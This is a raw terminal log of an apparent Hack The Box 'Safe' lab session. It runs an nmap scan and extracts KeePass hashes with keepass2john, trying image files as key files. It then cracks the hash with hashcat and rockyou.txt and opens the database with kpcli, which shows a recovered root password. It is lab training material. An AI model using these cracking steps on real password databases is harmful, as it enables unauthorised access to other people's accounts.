@@ -1,0 +1,405 @@
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #nmap -p- -v 10.10.10.147          
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 02:05 EST                  
+Initiating Ping Scan at 02:05           
+Scanning 10.10.10.147 [4 ports]         
+Completed Ping Scan at 02:05, 0.25s elapsed (1 total hosts)                      
+Initiating Parallel DNS resolution of 1 host. at 02:05                           
+Completed Parallel DNS resolution of 1 host. at 02:05, 0.01s elapsed             
+Initiating SYN Stealth Scan at 02:05    
+Scanning 10.10.10.147 [65535 ports]     
+Discovered open port 80/tcp on 10.10.10.147                                      
+Discovered open port 22/tcp on 10.10.10.147                                      
+Increasing send delay for 10.10.10.147 from 0 to 5 due to 602 out of 2005 dropped probes since last increase.                                                     
+SYN Stealth Scan Timing: About 4.36% done; ETC: 02:17 (0:11:19 remaining)        
+SYN Stealth Scan Timing: About 5.24% done; ETC: 02:25 (0:18:24 remaining)        
+SYN Stealth Scan Timing: About 6.09% done; ETC: 02:30 (0:23:24 remaining)        
+SYN Stealth Scan Timing: About 9.51% done; ETC: 02:26 (0:19:11 remaining)        
+SYN Stealth Scan Timing: About 12.88% done; ETC: 02:25 (0:17:02 remaining)       
+SYN Stealth Scan Timing: About 16.43% done; ETC: 02:24 (0:15:21 remaining)       
+SYN Stealth Scan Timing: About 19.68% done; ETC: 02:23 (0:14:21 remaining)       
+SYN Stealth Scan Timing: About 23.44% done; ETC: 02:22 (0:13:07 remaining)       
+SYN Stealth Scan Timing: About 27.63% done; ETC: 02:22 (0:12:13 remaining)       
+SYN Stealth Scan Timing: About 31.66% done; ETC: 02:22 (0:11:15 remaining)       
+SYN Stealth Scan Timing: About 36.04% done; ETC: 02:21 (0:10:19 remaining)       
+SYN Stealth Scan Timing: About 39.65% done; ETC: 02:24 (0:11:08 remaining)       
+SYN Stealth Scan Timing: About 40.73% done; ETC: 02:26 (0:12:06 remaining)       
+SYN Stealth Scan Timing: About 41.76% done; ETC: 02:28 (0:13:09 remaining)       
+SYN Stealth Scan Timing: About 46.34% done; ETC: 02:27 (0:11:58 remaining)       
+SYN Stealth Scan Timing: About 50.67% done; ETC: 02:27 (0:10:47 remaining)       
+SYN Stealth Scan Timing: About 55.36% done; ETC: 02:27 (0:09:40 remaining)       
+SYN Stealth Scan Timing: About 60.16% done; ETC: 02:27 (0:08:32 remaining)       
+SYN Stealth Scan Timing: About 64.79% done; ETC: 02:26 (0:07:26 remaining)       
+SYN Stealth Scan Timing: About 70.53% done; ETC: 02:27 (0:06:22 remaining)       
+SYN Stealth Scan Timing: About 75.56% done; ETC: 02:27 (0:05:14 remaining)       
+SYN Stealth Scan Timing: About 80.75% done; ETC: 02:27 (0:04:09 remaining)       
+Discovered open port 1337/tcp on 10.10.10.147                                    
+SYN Stealth Scan Timing: About 86.19% done; ETC: 02:27 (0:03:04 remaining)       
+SYN Stealth Scan Timing: About 91.47% done; ETC: 02:28 (0:01:56 remaining)       
+SYN Stealth Scan Timing: About 96.54% done; ETC: 02:28 (0:00:47 remaining)       
+Completed SYN Stealth Scan at 02:28, 1362.52s elapsed (65535 total ports)        
+Nmap scan report for 10.10.10.147       
+Host is up (0.21s latency).             
+Not shown: 65532 closed ports           
+PORT     STATE SERVICE                  
+22/tcp   open  ssh                      
+80/tcp   open  http                     
+1337/tcp open  waste                    
+
+Read data files from: /usr/bin/../share/nmap                                     
+Nmap done: 1 IP address (1 host up) scanned in 1362.98 seconds                   
+           Raw packets sent: 69438 (3.055MB) | Rcvd: 118082 (14.888MB)           
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #cd file/                          
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #exiftool *.jpg                    
+Error: File not found - *.jpg           
+┌─[✗]─[root@parrot]─[~/hackthebox/safe/file]                                     
+└──╼ #ls                                
+IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG  myapp  MyPasswords.kdbx  user.txt                                             
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #exiftool *.JPG                    
+======== IMG_0545.JPG                   
+ExifTool Version Number         : 11.77 
+File Name                       : IMG_0545.JPG                                   
+Directory                       : .     
+File Size                       : 1863 kB                                        
+File Modification Date/Time     : 2019:12:29 06:45:36-05:00                      
+File Access Date/Time           : 2019:12:29 06:45:28-05:00                      
+File Inode Change Date/Time     : 2019:12:29 06:45:36-05:00                      
+File Permissions                : rw-r--r--                                      
+File Type                       : JPEG  
+File Type Extension             : jpg   
+MIME Type                       : image/jpeg                                     
+Image Width                     : 3264  
+Image Height                    : 2448  
+Encoding Process                : Baseline DCT, Huffman coding                   
+Bits Per Sample                 : 8     
+Color Components                : 3     
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)                               
+Image Size                      : 3264x2448                                      
+Megapixels                      : 8.0   
+======== IMG_0546.JPG                   
+ExifTool Version Number         : 11.77 
+File Name                       : IMG_0546.JPG                                   
+Directory                       : .     
+File Size                       : 1872 kB                                        
+File Modification Date/Time     : 2019:12:29 06:45:42-05:00                      
+File Access Date/Time           : 2019:12:29 06:45:36-05:00                      
+File Inode Change Date/Time     : 2019:12:29 06:45:42-05:00                      
+File Permissions                : rw-r--r--                                      
+File Type                       : JPEG  
+File Type Extension             : jpg   
+MIME Type                       : image/jpeg                                     
+Image Width                     : 3264  
+Image Height                    : 2448  
+Encoding Process                : Baseline DCT, Huffman coding                   
+Bits Per Sample                 : 8     
+Color Components                : 3     
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)                               
+Image Size                      : 3264x2448                                      
+Megapixels                      : 8.0   
+======== IMG_0547.JPG                   
+ExifTool Version Number         : 11.77 
+File Name                       : IMG_0547.JPG                                   
+Directory                       : .     
+File Size                       : 2.4 MB                                         
+File Modification Date/Time     : 2019:12:29 06:45:47-05:00                      
+File Access Date/Time           : 2019:12:29 06:45:42-05:00                      
+File Inode Change Date/Time     : 2019:12:29 06:45:47-05:00                      
+File Permissions                : rw-r--r--                                      
+File Type                       : JPEG  
+File Type Extension             : jpg   
+MIME Type                       : image/jpeg                                     
+Image Width                     : 3264  
+Image Height                    : 2448  
+Encoding Process                : Baseline DCT, Huffman coding                   
+Bits Per Sample                 : 8     
+Color Components                : 3     
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)                               
+Image Size                      : 3264x2448                                      
+Megapixels                      : 8.0   
+======== IMG_0548.JPG                   
+ExifTool Version Number         : 11.77 
+File Name                       : IMG_0548.JPG                                   
+Directory                       : .     
+File Size                       : 2.8 MB                                         
+File Modification Date/Time     : 2019:12:29 06:45:52-05:00                      
+File Access Date/Time           : 2019:12:29 06:45:47-05:00                      
+File Inode Change Date/Time     : 2019:12:29 06:45:52-05:00                      
+File Permissions                : rw-r--r--                                      
+File Type                       : JPEG  
+File Type Extension             : jpg   
+MIME Type                       : image/jpeg                                     
+Image Width                     : 3264  
+Image Height                    : 2448  
+Encoding Process                : Baseline DCT, Huffman coding                   
+Bits Per Sample                 : 8     
+Color Components                : 3     
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)                               
+Image Size                      : 3264x2448                                      
+Megapixels                      : 8.0   
+======== IMG_0552.JPG                   
+ExifTool Version Number         : 11.77 
+File Name                       : IMG_0552.JPG                                   
+Directory                       : .     
+File Size                       : 1099 kB                                        
+File Modification Date/Time     : 2019:12:29 06:45:54-05:00                      
+File Access Date/Time           : 2019:12:29 06:45:52-05:00                      
+File Inode Change Date/Time     : 2019:12:29 06:45:54-05:00                      
+File Permissions                : rw-r--r--                                      
+File Type                       : JPEG  
+File Type Extension             : jpg   
+MIME Type                       : image/jpeg                                     
+Image Width                     : 3264  
+Image Height                    : 2448  
+Encoding Process                : Baseline DCT, Huffman coding                   
+Bits Per Sample                 : 8     
+Color Components                : 3     
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)                               
+Image Size                      : 3264x2448                                      
+Megapixels                      : 8.0   
+======== IMG_0553.JPG                   
+ExifTool Version Number         : 11.77 
+File Name                       : IMG_0553.JPG                                   
+Directory                       : .     
+File Size                       : 1060 kB                                        
+File Modification Date/Time     : 2019:12:29 06:45:56-05:00                      
+File Access Date/Time           : 2019:12:29 06:45:54-05:00                      
+File Inode Change Date/Time     : 2019:12:29 06:45:56-05:00                      
+File Permissions                : rw-r--r--                                      
+File Type                       : JPEG  
+File Type Extension             : jpg   
+MIME Type                       : image/jpeg                                     
+Image Width                     : 3264  
+Image Height                    : 2448  
+Encoding Process                : Baseline DCT, Huffman coding                   
+Bits Per Sample                 : 8     
+Color Components                : 3     
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)                               
+Image Size                      : 3264x2448                                      
+Megapixels                      : 8.0   
+    6 image files read                  
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #ls                                
+IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG  myapp  MyPasswords.kdbx  user.txt                                             
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #binwalk IMG_0552.JPG              
+
+DECIMAL       HEXADECIMAL     DESCRIPTION                                        
+-------------------------------------------------------------------------------- 
+
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #locate *2john                     
+/usr/sbin/bitlocker2john                
+/usr/sbin/dmg2john                      
+/usr/sbin/gpg2john                      
+/usr/sbin/hccap2john                    
+/usr/sbin/keepass2john                  
+/usr/sbin/putty2john                    
+/usr/sbin/racf2john                     
+/usr/sbin/rar2john                      
+/usr/sbin/uaf2john                      
+/usr/sbin/vncpcap2john                  
+/usr/sbin/wpapcap2john                  
+/usr/sbin/zip2john                      
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #/usr/sbin/keepass2john MyPasswords.kdbx >> keypass_hashes                  
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #cat keypass_hashes                
+MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #keepass2john --help               
+keepass2john: invalid option -- '-'     
+Usage: keepass2john [-k <keyfile>] <.kdbx database(s)>                           
+┌─[✗]─[root@parrot]─[~/hackthebox/safe/file]                                     
+└──╼ #for i in $(ls *.JPG);do keepass2john -k $i MyPasswords.kdbx | sed 's/MyPasswords/$i/g' >> keypass_hashes ;done                                              
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #cat keypass_hashes                
+MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2                    
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #for i in $(ls *.JPG);do keepass2john -k $i MyPasswords.kdbx | sed "s/MyPasswords/$i/g" >> keypass_hashes ;done                                              
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #cat keypass_hashes                                                                                                                                          
+MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794                    
+$i:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2                    
+IMG_0545.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae          
+IMG_0546.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162          
+IMG_0547.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7          
+IMG_0548.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f          
+IMG_0552.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794          
+IMG_0553.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2          
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #pluma keypass_hashes              
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #ls                                
+IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG  keypass_hashes  myapp  MyPasswords.kdbx  user.txt                             
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #cd ..                             
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #vi credential                     
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #keepass2john -k IMG_0547.JPG MyPasswords.kdbx | sed "s/MyPasswords/IMG_0547.JPG/g" >> keypass_hash_cheat                                                    
+! MyPasswords.kdbx : No such file or directory                                   
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #cd file/                          
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #keepass2john -k IMG_0547.JPG MyPasswords.kdbx | sed "s/MyPasswords/IMG_0547.JPG/g" >> keypass_hash_cheat                                                    
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #cat keypass_hash_cheat            
+IMG_0547.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7          
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #hashcat -m 13400 -O keypass_hash_cheat /opt/wordlists/rockyou.txt --user --force                                                                            
+hashcat (v5.1.0) starting...            
+
+OpenCL Platform #1: The pocl project    
+====================================    
+* Device #1: pthread-Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz, 512/1493 MB allocatable, 2MCU                                                                     
+
+/usr/share/hashcat/OpenCL/m13400-optimized.cl: Optimized OpenCL kernel requested but not needed - falling back to pure OpenCL kernel                              
+Hashes: 1 digests; 1 unique digests, 1 unique salts                              
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates     
+Rules: 1                                
+
+Applicable optimizers:                  
+* Zero-Byte                             
+* Single-Hash                           
+* Single-Salt                           
+
+Minimum password length supported by kernel: 0                                   
+Maximum password length supported by kernel: 256                                 
+
+Watchdog: Hardware monitoring interface not found on your system.                
+Watchdog: Temperature abort trigger disabled.                                    
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13400 -D _unroll'                                                    
+* Device #1: Kernel m13400-pure.2a6840b5.kernel not found in cache! Building may take a while...                                                                  
+4 warnings generated.                   
+warning: /usr/share/hashcat/OpenCL/inc_cipher_aes.cl:787:15: loop not unrolled: the optimizer was unable to perform the requested transformation; the transformation might be disabled or specified as part of an unsupported transformation ordering                                                                               
+warning: /usr/share/hashcat/OpenCL/inc_cipher_aes.cl:850:15: loop not unrolled: the optimizer was unable to perform the requested transformation; the transformation might be disabled or specified as part of an unsupported transformation ordering                                                                               
+warning: /usr/share/hashcat/OpenCL/inc_cipher_aes.cl:1034:15: loop not unrolled: the optimizer was unable to perform the requested transformation; the transformation might be disabled or specified as part of an unsupported transformation ordering                                                                              
+warning: /usr/share/hashcat/OpenCL/inc_cipher_aes.cl:1097:15: loop not unrolled: the optimizer was unable to perform the requested transformation; the transformation might be disabled or specified as part of an unsupported transformation ordering                                                                              
+
+Dictionary cache hit:                   
+* Filename..: /opt/wordlists/rockyou.txt                                         
+* Passwords.: 14344384                  
+* Bytes.....: 139921497                 
+* Keyspace..: 14344384                  
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s                               
+
+Session..........: hashcat              
+Status...........: Running              
+Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)                   
+Hash.Target......: $keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e50529380...6d93c7  
+Time.Started.....: Sun Dec 29 07:39:15 2019 (9 secs)                             
+Time.Estimated...: Fri Jan  3 12:38:39 2020 (5 days, 4 hours)                    
+Guess.Base.......: File (/opt/wordlists/rockyou.txt)                             
+Guess.Queue......: 1/1 (100.00%)        
+Speed.#1.........:       32 H/s (3.41ms) @ Accel:128 Loops:64 Thr:1 Vec:8        
+Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts                        
+Progress.........: 256/14344384 (0.00%) 
+Rejected.........: 0/256 (0.00%)        
+Restore.Point....: 256/14344384 (0.00%) 
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7744-7808                      
+Candidates.#1....: angelo -> letmein    
+
+$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7:bullshit              
+                                                                                 
+Session..........: hashcat              
+Status...........: Cracked              
+Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)                   
+Hash.Target......: $keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e50529380...6d93c7  
+Time.Started.....: Sun Dec 29 07:39:15 2019 (17 secs)                            
+Time.Estimated...: Sun Dec 29 07:39:32 2019 (0 secs)                             
+Guess.Base.......: File (/opt/wordlists/rockyou.txt)                             
+Guess.Queue......: 1/1 (100.00%)        
+Speed.#1.........:       61 H/s (2.59ms) @ Accel:128 Loops:64 Thr:1 Vec:8        
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts                    
+Progress.........: 1024/14344384 (0.01%)                                         
+Rejected.........: 0/1024 (0.00%)       
+Restore.Point....: 768/14344384 (0.01%) 
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59968-60000                    
+Candidates.#1....: football1 -> bethany 
+
+Started: Sun Dec 29 07:38:01 2019       
+Stopped: Sun Dec 29 07:39:33 2019       
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #cd ..                             
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #vi credential                     
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #vi credential                     
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #kpcli --help                      
+Usage: kpcli [--kdb=<file.kdb>] [--key=<file.key>]                               
+
+  --kdb         Optional KeePass database file to open (must exist).             
+  --key         Optional KeePass key file (must exist).                          
+  --pwfiles     Read master password from file instead of console.               
+  --histfile    Specify your history file (or perhaps /dev/null).                
+  --readonly    Run in read-only mode; no changes will be allowed.               
+  --timeout=i   Lock interface after i seconds of inactivity.                    
+  --command     Run single command and exit (no interactive session).            
+  --no-recycle  Don't store entry changes in /Backup or "/Recycle Bin".          
+  --help        This message.           
+
+Run kpcli with no options and type 'help' at its command prompt to learn         
+about kpcli's commands.                 
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #cd file/                          
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #kpcli --kdb MyPasswords.kdbx --key IMG_0547.JPG                            
+Please provide the master password: *************************                    
+
+KeePass CLI (kpcli) v3.1 is ready for operation.                                 
+Type 'help' for a description of available commands.                             
+Type 'help <command>' for details on individual commands.                        
+
+kpcli:/> ls                             
+=== Groups ===                          
+MyPasswords/                            
+kpcli:/> cd MyPasswords/                
+kpcli:/MyPasswords> ls                  
+=== Groups ===                          
+eMail/                                  
+General/                                
+Homebanking/                            
+Internet/                               
+Network/                                
+Recycle Bin/                            
+Windows/                                
+=== Entries ===                         
+0. Root password                                                                 
+kpcli:/MyPasswords> show 0              
+
+Title: Root password                    
+Uname: root                             
+ Pass: u3v2249dl9ptv465cogl3cnpo3fyhk   
+  URL:                                  
+Notes:                                  
+
